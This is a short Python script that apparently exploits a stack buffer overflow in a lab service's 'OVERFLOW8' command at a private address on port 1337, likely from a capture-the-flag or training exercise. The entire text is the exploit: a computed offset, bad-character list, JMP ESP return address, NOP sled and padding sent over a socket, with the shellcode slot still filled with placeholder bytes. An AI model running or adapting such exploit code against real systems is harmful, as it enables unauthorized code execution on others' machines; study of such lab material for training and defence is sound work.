import socket, struct
host, port = '10.10.243.3',1337



command = b'OVERFLOW8 '
length = 2000
offset = 1786
new_eip = b'BBBB'
bad_chars = [
b'\x1d',
b'\x2e',
b'\xc7',
b'\xee'
]

def p32(data):
        return struct.pack("<I", data)

jmp_esp = p32(0x625011D3)


all_chars = bytearray(range(1,256))
for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')


nop_sled = b'\x90' * 10

payload = b''.join([

command,
b'A' * offset,
jmp_esp,
nop_sled,
b'C' * (length - offset - len(new_eip) - len(nop_sled)),


])





with socket.socket() as s:
        s.connect((host, port))
        s.send(payload)
